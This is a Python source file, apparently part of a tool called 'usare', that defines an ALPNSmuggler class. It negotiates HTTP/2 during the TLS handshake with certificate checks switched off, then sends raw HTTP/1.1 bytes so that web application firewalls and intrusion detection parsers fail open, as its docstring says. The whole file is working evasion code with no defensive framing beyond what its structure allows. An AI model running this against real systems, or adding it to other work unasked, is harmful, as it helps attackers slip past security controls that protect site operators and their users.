import socket
import ssl
import time
import logging

logger = logging.getLogger("usare.alpn_smuggler")

class ALPNSmuggler:
    """
    Negotiates an ALPN of h2 during the TLS handshake to force DPI/IDS to parse 
    subsequent HTTP/2 binary frames. Immediately sends raw HTTP/1.1 bytes over the tunnel,
    often causing stateful WAFs/parsers to enter a fail-open or panic state due to 
    fundamental protocol violation within the encryption tunnel.
    """
    def __init__(self, timeout: float = 5.0):
        self.timeout = timeout

    def smuggle(self, target_ip: str, port: int, payload: bytes) -> dict:
        results = {
            "success": False,
            "connected": False,
            "alpn_negotiated": None,
            "response_data": b"",
            "error_state": None,
            "latency_ms": 0.0
        }
        
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        # We explicitly demand http/2 only.
        ctx.set_alpn_protocols(["h2"])
        
        start_time = time.time()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            conn = ctx.wrap_socket(sock, server_hostname=target_ip)
            conn.connect((target_ip, port))
            results["connected"] = True
            results["alpn_negotiated"] = conn.selected_alpn_protocol()
            
            # Send HTTP/1.1 payload despite ALPN saying H2
            conn.sendall(payload)
            
            try:
                response = conn.recv(4096)
                results["response_data"] = response
                if response:
                    results["success"] = True
            except socket.timeout:
                results["error_state"] = "timeout_waiting_for_h1_response"
            finally:
                conn.close()
                
        except ssl.SSLError as e:
            results["error_state"] = f"SSL Error: {e}"
        except Exception as e:
            results["error_state"] = f"Network Error: {e}"
            
        results["latency_ms"] = (time.time() - start_time) * 1000
        return results
